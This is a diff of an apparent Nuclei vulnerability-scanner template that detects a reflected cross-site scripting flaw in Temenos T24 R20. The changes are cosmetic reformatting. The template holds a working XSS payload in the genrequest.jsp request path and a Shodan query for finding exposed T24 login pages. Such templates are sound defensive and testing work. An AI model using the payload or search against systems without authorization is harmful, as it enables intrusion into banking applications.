@@ -1,5 +1,4 @@
 id: temenos-t24-xss
-
 info:
   name: Temenos T24 R20 - Cross-Site Scripting
   author: r3Y3r53
@@ -22,18 +21,16 @@ info:
     cwe-id: CWE-79
     cpe: cpe:2.3:a:temenos:t24:*:*:*:*:*:*:*:*
   metadata:
-    verified: true
     max-request: 1
-    shodan-query: title:"T24 Sign in"
     product: t24
+    shodan-query: title:"T24 Sign in"
     vendor: temenos
-  tags: xss,temenos,vuln
-
+    verified: true
+  tags: temenos,vuln,xss
 http:
   - method: GET
     path:
       - '{{BaseURL}}/jsps/genrequest.jsp?routineName="><script>alert(document.domain)</script>'
-
     matchers-condition: and
     matchers:
       - type: word
@@ -42,8 +39,7 @@ http:
           - "<script>alert(document.domain)</script>"
           - "<title>Processing...</title>"
         condition: and
-
       - type: status
         status:
           - 200
-# digest: 4a0a0047304502206be6d44ad1ed39fa30e6bc3bed347bb1c06f2b0e604dfabb0a0d511b993bd264022100e3d5262c3f341b54104542283b34ca6c8a63a19c8572e04c96e2f8cabe11e012:922c64590222798bb761d5b6d8e72950
+        # digest: 4a0a0047304502206be6d44ad1ed39fa30e6bc3bed347bb1c06f2b0e604dfabb0a0d511b993bd264022100e3d5262c3f341b54104542283b34ca6c8a63a19c8572e04c96e2f8cabe11e012:922c64590222798bb761d5b6d8e72950
